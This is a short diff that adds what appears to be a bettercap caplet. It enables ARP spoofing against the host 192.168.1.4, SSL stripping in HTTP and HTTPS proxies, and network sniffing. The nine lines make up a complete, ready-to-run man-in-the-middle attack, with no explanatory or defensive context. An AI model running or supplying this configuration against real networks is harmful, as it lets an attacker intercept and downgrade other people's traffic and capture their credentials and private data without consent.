@@ -1,0 +1,9 @@
+set http.proxy.sslstrip true
+set https.proxy.sslstrip true
+set arp.spoof.internal true
+set arp.spoof.targets 192.168.1.4
+set net.sniff.verbose false
+net.sniff on
+http.proxy on
+https.proxy on
+arp.spoof on
